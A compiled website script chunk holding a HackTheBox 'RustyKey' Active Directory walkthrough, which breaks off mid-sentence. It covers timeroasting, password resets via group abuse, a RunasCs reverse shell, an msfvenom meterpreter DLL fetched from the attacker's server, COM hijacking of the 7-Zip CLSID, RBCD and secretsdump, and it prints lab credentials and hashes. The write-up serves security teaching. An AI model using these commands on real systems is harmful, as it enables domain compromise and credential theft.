"use strict";(globalThis.webpackChunksitee=globalThis.webpackChunksitee||[]).push([[68],{107(e,s,n){n.d(s,{A:()=>t});const t=n.p+"assets/images/image 1-9739d55f2d965e02d5f26723a03d7622.png"},118(e,s,n){n.d(s,{A:()=>t});const t=n.p+"assets/images/image 4-f1f0eb0acd02ac8cb692d5f8cd7da53d.png"},188(e,s,n){n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>l,default:()=>u,frontMatter:()=>d,metadata:()=>t,toc:()=>h});const t=JSON.parse('{"id":"HTB/RustyKey/index","title":"RustyKey","description":"Full HackTheBox RustyKey machine walkthrough and exploitation steps.","source":"@site/docs/HTB/RustyKey/index.mdx","sourceDirName":"HTB/RustyKey","slug":"/HTB/RustyKey/","permalink":"/writeups/docs/HTB/RustyKey/","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"RustyKey","description":"Full HackTheBox RustyKey machine walkthrough and exploitation steps.","keywords":["HTB","writeup","rustykey","walkthrough"],"sidebar_position":1,"toc_min_heading_level":2,"toc_max_heading_level":3},"sidebar":"htbSidebar","next":{"title":"\ud83d\udd12 Gavel (Active)","permalink":"/writeups/docs/HTB/Gavel/"}}');var r=n(4848),a=n(8453),i=n(8320);const o=n.p+"assets/images/rustykeypfp-c931bc7459c9a6ef804922785200e4d6.png",d={title:"RustyKey",description:"Full HackTheBox RustyKey machine walkthrough and exploitation steps.",keywords:["HTB","writeup","rustykey","walkthrough"],sidebar_position:1,toc_min_heading_level:2,toc_max_heading_level:3},l="RustyKey",c={},h=[{value:"User",id:"user",level:2},{value:"Nmap Scan",id:"nmap-scan",level:3},{value:"Bloodhound",id:"bloodhound",level:3},{value:"Timeroasting",id:"timeroasting",level:3},{value:"Foothold",id:"foothold",level:3},{value:"PrivEsc",id:"privesc",level:2},{value:"Getting into Support",id:"getting-into-support",level:3},{value:"Shell as ee.reed",id:"shell-as-eereed",level:3},{value:"Shell as mm.turner",id:"shell-as-mmturner",level:3}];function p(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(i.A,{image:o}),"\n",(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"rustykey",children:"RustyKey"})}),"\n",(0,r.jsx)(s.p,{children:"Machine IP: 10.10.11.75"}),"\n",(0,r.jsxs)(s.p,{children:["Difficulty: Hard, OS: Windows, Creator: ",(0,r.jsx)(s.a,{href:"https://app.hackthebox.com/users/962022",children:"EmSec"})]}),"\n",(0,r.jsx)(s.p,{children:"This is an assumed breach box so we have intial creds:"}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"User:"}),"  rr.parker"]}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"Pass:"}),"  8#t5HE8L!W3A"]}),"\n",(0,r.jsx)(s.h2,{id:"user",children:"User"}),"\n",(0,r.jsx)(s.h3,{id:"nmap-scan",children:"Nmap Scan"}),"\n",(0,r.jsx)(s.p,{children:"We scan the target with nmap and get the following ports:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"PORT     STATE SERVICE       VERSION                                                                   \r\n53/tcp   open  domain        Simple DNS Plus                                                           \r\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-18 02:08:49Z)            \r\n135/tcp  open  msrpc         Microsoft Windows RPC                                                     \r\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                             \r\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                  \r\n445/tcp  open  microsoft-ds?                                                                           \r\n464/tcp  open  kpasswd5?                                                                               \r\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                       \r\n636/tcp  open  tcpwrapped                                                                              \r\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)                                                                                  \r\n3269/tcp open  tcpwrapped                                                                              \r\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                   \r\n|_http-title: Not Found                                                                                \r\n|_http-server-header: Microsoft-HTTPAPI/2.0                                                            \r\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows                                     \r\n                                                                                                       \r\nHost script results:                                                                                   \r\n| smb2-security-mode:                                                                                  \r\n|   3:1:1: \r\n|_    Message signing enabled and required\r\n| smb2-time: \r\n|   date: 2025-11-18T02:08:56\r\n|_  start_date: N/A\r\n|_clock-skew: 8h00m00s\r\n\n"})}),"\n",(0,r.jsxs)(s.p,{children:["From this output we can get the clock skew and the domain ",(0,r.jsx)(s.strong,{children:"rustykey.htb"}),", although it doesn\u2019t show us the FQDN. We add ",(0,r.jsx)(s.strong,{children:"rustykey.htb"})," to our ",(0,r.jsx)(s.code,{children:"/etc/hosts"})," file, and if we run NetExec against SMB, we see that NTLM Authentication is disabled:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/HTB/Machines/Hard/Rustykey]\r\n\u2514\u2500$ nxc smb 10.10.11.75 \r\nSMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) **(NTLM:False)**\r\n\n"})}),"\n",(0,r.jsx)(s.p,{children:"We can also get the domain controller through ldap:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/HTB/Machines/Hard/Rustykey]\r\n\u2514\u2500$ nxc ldap 10.10.11.75                                                           \r\nLDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)\n"})}),"\n",(0,r.jsx)(s.p,{children:"NetExec\u2019s coerce check also finds a few potential vulnerabilities which may or may not prove useful:"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(954).A+"",width:"812",height:"99"})}),"\n",(0,r.jsx)(s.h3,{id:"bloodhound",children:"Bloodhound"}),"\n",(0,r.jsxs)(s.p,{children:["By looking at bloodhound, we see ",(0,r.jsx)(s.strong,{children:"IT-Computer3"})," has ",(0,r.jsx)(s.strong,{children:"AddSelf"})," to the ",(0,r.jsx)(s.strong,{children:"Helpdesk"})," group."]}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(107).A+"",width:"1224",height:"310"})}),"\n",(0,r.jsx)(s.p,{children:"Additionally, we can see that the password for this computer was last set 1 day after it was created. Computer objects automatically change their passwords every 30 days, so this one changing after one day means it is a user-set password, which makes it is weak."}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(6288).A+"",width:"401",height:"749"})}),"\n",(0,r.jsxs)(s.p,{children:["We can run a ",(0,r.jsx)(s.strong,{children:"timeroast"})," attack against computers which gives us the hash of their passwords. Since IT-Computer3\u2019s password is user-set, it is therefore weak and could be potentially cracked."]}),"\n",(0,r.jsx)(s.h3,{id:"timeroasting",children:"Timeroasting"}),"\n",(0,r.jsx)(s.p,{children:"We run NetExec\u2019s timeroast module:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"nxc smb dc.rustykey.htb -M timeroast  \n"})}),"\n",(0,r.jsx)(s.p,{children:"This gives us a bunch of hashes:"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(2537).A+"",width:"1786",height:"450"})}),"\n",(0,r.jsx)(s.p,{children:"We copy all of these into a timeroasthashes.txt file, which we then format properly using"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"cat timeroasthashes.txt | awk '{print $5}' > t  # 5 since the hashes are the 5th field\n"})}),"\n",(0,r.jsx)(s.p,{children:"Now we can use hashcat to attempt to crack these"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"hashcat timeroasthashes.txt ~/Desktop/rockyou.txt --user \n"})}),"\n",(0,r.jsxs)(s.p,{children:["And sure enough, we get a hit on RID 1125, which is IT-Computer3 whose pass is ",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"Rusty88!"})})]}),"\n",(0,r.jsx)(s.h3,{id:"foothold",children:"Foothold"}),"\n",(0,r.jsx)(s.p,{children:"We now have new credentials. As we saw on bloodhound, IT-Computer3 can addSelf to Helpdesk."}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(118).A+"",width:"1441",height:"713"})}),"\n",(0,r.jsxs)(s.p,{children:["Helpdesk has a few outbound object controls. ",(0,r.jsx)(s.strong,{children:"GG.ANDERSON"})," is disabled, but the rest of the users are enabled."]}),"\n",(0,r.jsxs)(s.p,{children:["Remote Management Users group: ",(0,r.jsx)(s.strong,{children:"ee.reed, bb.morgan, gg.anderson (disabled)"})]}),"\n",(0,r.jsx)(s.p,{children:"Let\u2019s first get into bb.morgan."}),"\n",(0,r.jsx)(s.p,{children:"First, let\u2019s add ourselves to helpdesk:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nadd groupMember 'Helpdesk' 'IT-COMPUTER3$'\n"})}),"\n",(0,r.jsx)(s.p,{children:"Next, let\u2019s change bb.morgan\u2019s pass:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nset password 'bb.morgan' 'NewP@ss123' \n"})}),"\n",(0,r.jsx)(s.p,{children:"However, when trying to get a TGT we get this error:"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(1663).A+"",width:"901",height:"106"})}),"\n",(0,r.jsx)(s.p,{children:"If we take another look at bb.morgan\u2019s groups, we see he is in Protected Objects (and so is ee.reed)."}),"\n",(0,r.jsx)(s.p,{children:"However, IT-Computer3$ could write to Protected Objects:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/HTB/Machines/Hard/Rustykey]\r\n\u2514\u2500$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nget writable \r\n\r\ndistinguishedName: CN=TPM Devices,DC=rustykey,DC=htb\r\npermission: CREATE_CHILD\r\n\r\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=rustykey,DC=htb\r\npermission: WRITE\r\n\r\ndistinguishedName: CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb\r\npermission: CREATE_CHILD; WRITE\r\n\r\n**distinguishedName: CN=Protected Objects,CN=Users,DC=rustykey,DC=htb\r\npermission: WRITE**\r\n\r\ndistinguishedName: CN=dd.ali,OU=Users,OU=Finance,DC=rustykey,DC=htb\r\npermission: WRITE\r\n\n"})}),"\n",(0,r.jsx)(s.p,{children:"We see that bb.morgan is in the Protected Objects group because of IT, so we can remove IT from Protected Objects"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(196).A+"",width:"1268",height:"536"})}),"\n",(0,r.jsx)(s.p,{children:"We use bloodyAD:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/HTB/Machines/Hard/Rustykey]\r\n\u2514\u2500$ bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nremove groupMember 'Protected Objects' 'IT'\r\n[-] IT removed from Protected Objects\r\n\n"})}),"\n",(0,r.jsx)(s.p,{children:"and this time getting the TGT works:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/HTB/Machines/Hard/Rustykey]\r\n\u2514\u2500$ impacket-getTGT RUSTYKEY.HTB/'bb.morgan':'NewP@ss123'                                                                     \r\nImpacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies \r\n\r\n[*] Saving ticket in bb.morgan.ccache\r\n\n"})}),"\n",(0,r.jsx)(s.p,{children:"From there we just set the KRB5CCNAME env variable to the ccache we got and connect through evil-winrm-py to get the user flag which is in the user\u2019s desktop."}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.code,{children:"evil-winrm-py -i dc.rustykey.htb -k"})}),"\n",(0,r.jsx)(s.p,{children:"If we had worked with reed first, we would\u2019ve gotten into a roadblock after changing the password and removing her from Protected Objects, because we wouldn\u2019t be able to log in anywhere. Still not sure why.."}),"\n",(0,r.jsx)(s.h2,{id:"privesc",children:"PrivEsc"}),"\n",(0,r.jsxs)(s.p,{children:["Among the user flag, there is another file called ",(0,r.jsx)(s.code,{children:"internal.pdf"})," . We download it and open it in our host. The pdf is an email from bb.morgan to the support team, and mentions something that looks important:"]}),"\n",(0,r.jsxs)("aside",{children:[(0,r.jsx)(s.p,{children:"\ud83d\udca1"}),(0,r.jsx)(s.p,{children:"Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase."})]}),"\n",(0,r.jsx)(s.p,{children:"Through the pdf, we learn that there have been some changes on zipping stuff (as it mentions compressing/extracting). Context menus, are COM objects, and they work with CLSIDs (Class Identifiers). COMs (Component Object Modules) are the thing that enables applications to share functionality. For example, you can open a zip file through explorer, and it treats it like a virtual folder. That works because there is a COM object that points to that type of file and uses that DLL so when another program tries to open it it uses that DLL in order to process it."}),"\n",(0,r.jsx)(s.p,{children:"What does that mean for this case? Well for starters, we can query registries that have  CLSIDs in them:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:'evil-winrm-py PS C:\\Users\\bb.morgan\\Desktop> reg query HKCR\\CLSID /s /f "zip"\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\r\n    (Default)    REG_SZ    7-Zip Shell Extension\r\n\r\n**HKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\r\n    (Default)    REG_SZ    C:\\Program Files\\7-Zip\\7-zip.dll**\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\r\n    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target\r\n    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\\system32\\zipfldr.dll,-10226\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\\DefaultIcon\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\\InProcServer32\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\r\n    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\\InProcServer32\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{BD472F60-27FA-11cf-B8B4-444553540000}\r\n    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{BD472F60-27FA-11cf-B8B4-444553540000}\\InProcServer32\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\\DefaultIcon\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\\InProcServer32\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{ed9d80b9-d157-457b-9192-0e7280313bf0}\r\n    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler\r\n\r\nHKEY_CLASSES_ROOT\\CLSID\\{ed9d80b9-d157-457b-9192-0e7280313bf0}\\InProcServer32\r\n    (Default)    REG_EXPAND_SZ    %SystemRoot%\\system32\\zipfldr.dll\r\n\r\nEnd of search: 14 match(es) found.\r\n\n'})}),"\n",(0,r.jsx)(s.p,{children:"The second result is the CLSID of 7zip. What that means is, the CLSID"}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"{23170F69-40C1-278A-1000-000100020000}"})}),"  is gonna use the 7zip DLL. We can check its permissions:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:'Get-ACL "Registry::HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32" | fl\n'})}),"\n",(0,r.jsx)(s.p,{children:"(the fl part is format list, otherwise we can\u2019t really read the output properly)"}),"\n",(0,r.jsx)(s.p,{children:"The output:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"Path   : Microsoft.PowerShell.Core\\Registry::HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\r\nOwner  : BUILTIN\\Administrators\r\nGroup  : RUSTYKEY\\Domain Users\r\nAccess : APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES Allow  ReadKey\r\n         BUILTIN\\Administrators Allow  FullControl\r\n         CREATOR OWNER Allow  FullControl\r\n         **RUSTYKEY\\Support Allow  FullControl**\r\n         NT AUTHORITY\\SYSTEM Allow  FullControl\r\n         BUILTIN\\Administrators Allow  FullControl\r\n         BUILTIN\\Users Allow  ReadKey\r\nAudit  : \r\nSddl   : O:BAG:DUD:AI(A;CIID;KR;;;AC)(A;ID;KA;;;BA)(A;CIIOID;KA;;;CO)(A;CIID;KA;;;S-1-5-21-3316070415-896458127-41393220\r\n         52-1132)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;BA)(A;CIID;KR;;;BU)\n"})}),"\n",(0,r.jsxs)(s.p,{children:["Shows that the ",(0,r.jsx)(s.strong,{children:"Support"})," group has full control. Previously, we saw that ",(0,r.jsx)(s.strong,{children:"ee.reed"})," was in the support group, so it\u2019s time to get access to her account."]}),"\n",(0,r.jsx)(s.h3,{id:"getting-into-support",children:"Getting into Support"}),"\n",(0,r.jsxs)(s.p,{children:["We do the same attack, but this time we want access to ",(0,r.jsx)(s.strong,{children:"ee.reed"}),". First, let\u2019s add ourselves back to the Helpdesk group:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nadd groupMember 'Helpdesk' 'IT-COMPUTER3$'\n"})}),"\n",(0,r.jsx)(s.p,{children:"then, let\u2019s change the password of ee.reed:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nset password 'ee.reed' 'NewP@ss123'\n"})}),"\n",(0,r.jsx)(s.p,{children:"ee.reed is part of the Protected Objects group because of the Support group, so we\u2019ll have to remove that too"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(1325).A+"",width:"1622",height:"601"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k \\\r\nremove groupMember 'Protected Objects' 'Support'\n"})}),"\n",(0,r.jsx)(s.p,{children:"And now all that remains is to get the TGT:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"impacket-getTGT RUSTYKEY.HTB/'ee.reed':'NewP@ss123' \n"})}),"\n",(0,r.jsx)(s.p,{children:"However, when trying to authenticate using NetExec, evil-winrm or anything like that, we keep getting error messages. That means there is something blocking remote access, and ee.reed can only do local logins. This means that we\u2019re going to have to use RunasCs.exe"}),"\n",(0,r.jsxs)(s.p,{children:["We get back into our winrm connection as bb.morgan, upload RunasCs.exe and run a reverse shell. We start a listener with ",(0,r.jsx)(s.code,{children:"penelope -p 1234"})," and then we run the shell:"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:".\\RunasCs.exe ee.reed 'NewP@ss123' powershell -r 10.10.14.132:1234\n"})}),"\n",(0,r.jsx)(s.p,{children:"Now we have a shell as ee.reed"}),"\n",(0,r.jsx)(s.h3,{id:"shell-as-eereed",children:"Shell as ee.reed"}),"\n",(0,r.jsxs)(s.p,{children:["As we saw previously, ee.reed is part of the Support group who can modify the registry with the CLSID of 7zip. First, let\u2019s get a DLL that will give us a reverse shell. We can craft one with ",(0,r.jsx)(s.code,{children:"msfvenom"})," :"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.132 LPORT=9001 -f dll \\\r\n-o payload.dll\n"})}),"\n",(0,r.jsx)(s.p,{children:"We get our listener ready:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"msfconsole -q\r\nmsf> use multi/handler\r\nmsf> set payload windows/x64/meterpreter/reverse_tcp\r\nmsf> set lhost 10.10.14.132\r\nmsf> set lport 9001\r\nmsf> set ExitOnSession false\r\nmsf> exploit -j\n"})}),"\n",(0,r.jsx)(s.p,{children:"Then, we need to get our payload onto the target. For that, let\u2019s start a python server to host the file"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"python3 -m http.server 8000 \n"})}),"\n",(0,r.jsx)(s.p,{children:"On the target, head to C:\\ProgramData and get the file:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"wget http://10.10.14.132:8000/payload.dll -o payl.dll\n"})}),"\n",(0,r.jsx)(s.p,{children:"Now, we need to point the 7zip CLSID to our malicious DLL:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:'Set-ItemProperty "Registry::HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32"-name "(default)" -value "C:\\ProgramData\\payl.dll"\n'})}),"\n",(0,r.jsx)(s.p,{children:"Now if we run Get-Item"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:'Get-Item "Registry::HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32"\n'})}),"\n",(0,r.jsx)(s.p,{children:"We see it is pointing to our dll:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"Name                           Property                                                                                \r\n----                           --------                                                                                \r\nInprocServer32                 (default)      : C:\\ProgramData\\payl.dll                                                \r\n                               ThreadingModel : Apartment \n"})}),"\n",(0,r.jsx)(s.p,{children:"Now, when a user tries to open up a 7zip file, it is going to access a dll and send us a reverse shell."}),"\n",(0,r.jsxs)(s.p,{children:["Sure enough, after some time, we get a connection on our listener. After running ",(0,r.jsx)(s.code,{children:"whoami"})," , we see that the shell we have is as ",(0,r.jsx)(s.code,{children:"mm.turner"})," ."]}),"\n",(0,r.jsx)(s.h3,{id:"shell-as-mmturner",children:"Shell as mm.turner"}),"\n",(0,r.jsx)(s.p,{children:"If we look at bloodhound\u2019s outbound object controls for mm.turner, we see that he is part of the Delegation Manager groups, who can act on the DC"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(554).A+"",width:"1094",height:"536"})}),"\n",(0,r.jsx)(s.p,{children:"This lets us do RBCD (Resource Based Constraint Delegation) so we need to get a user we want to delegate. If we look at the Administrator account, we see it has"}),"\n",(0,r.jsx)(s.p,{children:"Trusted For Constrained Delegation: False"}),"\n",(0,r.jsx)(s.p,{children:"so we can\u2019t use that"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image.png",src:n(2467).A+"",width:"419",height:"746"})}),"\n",(0,r.jsx)(s.p,{children:"The same goes for the Backupadmin user."}),"\n",(0,r.jsx)(s.p,{children:"So let\u2019s use our IT-COMPUTER3 account to impersonate other accounts (aka generate silver tickets)."}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$\n"})}),"\n",(0,r.jsx)(s.p,{children:"and we can confirm this worked through the command:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"Get-ADComputer DC -properties PrincipalsAllowedToDelegateToAccount\r\n\r\nDistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb\r\nDNSHostName                          : dc.rustykey.htb\r\nEnabled                              : True\r\nName                                 : DC\r\nObjectClass                          : computer\r\nObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c\r\nPrincipalsAllowedToDelegateToAccount : {CN=**IT-Computer3**,OU=Computers,OU=IT,DC=rustykey,DC=htb}\r\nSamAccountName                       : DC$\r\nSID                                  : S-1-5-21-3316070415-896458127-4139322052-1000\r\nUserPrincipalName                    : \r\n\n"})}),"\n",(0,r.jsx)(s.p,{children:"Now we just need the silver ticket:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"getST.py -spn cifs/dc.rustykey.htb -impersonate 'backupadmin' \\\r\nrustykey.htb/'IT-COMPUTER3$':'Rusty88!'\n"})}),"\n",(0,r.jsx)(s.p,{children:"Note: We don\u2019t need to create a computer account in this case because we already know the password of IT-Computer3. The reason we create a new computer account usually in this attack is so that we can specify the password, which we don\u2019t need to do here."}),"\n",(0,r.jsx)(s.p,{children:"Now we have the ccache of backupadmin (if we tried to do it with admin it would fail) so we can secretsdump:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"secretsdump.py rustykey.htb/'backupadmin'@dc.rustykey.htb -k -no-pass\n"})}),"\n",(0,r.jsx)(s.p,{children:"And in that command we see the following snippet:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"[--SNIP--]\r\n[*] $MACHINE.ACC \r\nRUSTYKEY\\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25\r\nRUSTYKEY\\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::\r\n[*] DefaultPassword \r\n**RUSTYKEY\\Administrator:Rustyrc4key#!**\r\n[*] DPAPI_SYSTEM \r\ndpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397\r\ndpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c\r\n[--SNIP--]\n"})}),"\n",(0,r.jsxs)(s.p,{children:["Which shows the password of Administrator being ",(0,r.jsx)(s.code,{children:"Rustyrc4key#!"})]}),"\n",(0,r.jsx)(s.p,{children:"We can confirm that with NetExec:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"nxc smb dc.rustykey.htb -u 'Administrator' -p 'Rustyrc4key#!' -k\r\n\r\nSMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                        \r\nSMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\\Administrator:Rustyrc4key#! (Pwn3d!) \n"})}),"\n",(0,r.jsx)(s.p,{children:"That means that all that\u2019s left is to get the TGT"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"impacket-getTGT RUSTYKEY.HTB/'Administrator':'Rustyrc4key#!'\n"})}),"\n",(0,r.jsx)(s.p,{children:"and finally log in with 